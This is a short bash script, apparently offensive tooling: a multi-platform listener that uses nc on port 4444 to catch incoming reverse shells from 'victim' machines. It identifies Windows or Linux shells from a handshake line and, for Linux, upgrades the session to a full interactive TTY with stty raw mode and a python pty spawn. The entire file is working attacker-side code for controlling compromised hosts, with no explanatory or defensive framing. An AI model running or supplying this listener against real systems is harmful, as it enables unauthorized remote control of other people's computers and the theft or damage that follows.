#!/bin/bash
PORT=${1:-4444}

echo -e "\e[1;32m[+]\e[0m Automated Multi-Platform Listener on port \e[1;33m$PORT\e[0m..."
echo "[*] Waiting for victim handshake..."

# Catch the handshake
IDENT=$(nc -lvnp $PORT | head -n 1)

if [[ "$IDENT" == *"WINDOWS_SHELL"* ]]; then
    echo -e "\e[1;36m[*]\e[0m Windows detected!"
    # FORCE terminal to sane mode so we can type full commands
    stty sane
    nc -lvnp $PORT
elif [[ "$IDENT" == *"LINUX_SHELL"* ]]; then
    echo -e "\e[1;34m[*]\e[0m Linux detected! Starting Interactive TTY Upgrade..."
    # Use RAW mode ONLY for Linux
    stty raw -echo; (echo "stty cols $(tput cols) rows $(tput lines) 2>/dev/null; export TERM=xterm-256color; python3 -c 'import pty; pty.spawn(\"/bin/bash\")' || /usr/bin/script -qc /bin/bash /dev/null"; cat) | nc -lvnp $PORT; stty sane
else
    echo -e "\e[1;31m[!]\e[0m Unknown handshake: $IDENT."
    stty sane
    nc -lvnp $PORT
fi
